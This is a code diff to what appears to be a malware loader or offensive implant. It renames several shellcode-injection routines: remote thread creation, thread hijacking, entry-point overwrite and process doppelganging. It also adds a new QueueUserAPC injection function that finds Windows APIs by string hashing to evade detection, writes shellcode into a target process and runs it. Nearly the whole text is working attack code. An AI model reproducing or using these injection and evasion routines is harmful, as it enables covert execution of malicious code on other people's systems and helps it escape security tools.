@@ -4,7 +4,7 @@ namespace execute {
 	//
 	// Remote Thread Injection
 	//
-	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
 	{
 		PVOID address_ptr = NULL;
 		BOOL success = FALSE;
@@ -62,7 +62,7 @@ namespace execute {
 	//
 	//Remote Thread Hijacking via Thread Enumeration
 	//
-	BOOL RemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
 	{
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
@@ -199,9 +199,9 @@ namespace execute {
 	}
 
 	//
-	// AddressOfEntryPoint Injection
+	// InjectionAddressOfEntryPoint Injection
 	//
-	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
 	{
 		BOOL success = FALSE;
 		HMODULE ntdll = NULL;
@@ -221,8 +221,8 @@ namespace execute {
 		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
 
 #pragma endregion
-
-		NtResumeThreadC(process_handle, NULL); // From CONFIG_CREATE_PROCESS_METHOD 3
+		// Handle from CONFIG_CREATE_PROCESS_METHOD 3
+		NtResumeThreadC(process_handle, NULL);
 		LOG_SUCCESS("Resuming Thread");
 
 		success = TRUE;
@@ -235,7 +235,7 @@ namespace execute {
 	//
 	// Process Doppleganging
 	//
-	BOOL Doppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
 	{
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
@@ -266,6 +266,45 @@ namespace execute {
 	CLEANUP:
 		// CloseHandleC(process_handle);
 		// CloseHandleC(thread_handle);
+		return success;
+	}
+
+	//
+	// QueueUserApc Injection
+	//
+	BOOL InjectionQueueUserInject(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
+	{
+		BOOL success = FALSE;
+		HMODULE ntdll = NULL;
+		HMODULE kernel32 = NULL;
+
+#pragma region Imports
+		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
+		constexpr ULONG hash_queueuserapc = malapi::HashStringFowlerNollVoVariant1a("QueueUserAPC");
+		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+
+		typeQueueUserAPC QueueUserAPCC = (typeQueueUserAPC)malapi::GetProcAddressC(kernel32, hash_queueuserapc);
+		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		typeNtClose NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
+
+#pragma endregion
+
+		HANDLE base_address = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
+		QueueUserAPCC((PAPCFUNC)base_address, additional_handle, 0);
+
+		NtResumeThreadC(additional_handle, NULL);
+		LOG_SUCCESS("Resuming Thread");
+
+		success = TRUE;
+
+	CLEANUP:
+		NtCloseC(additional_handle);
+		NtCloseC(process_handle);
 		return success;
 	}
 } // End of execute namespace
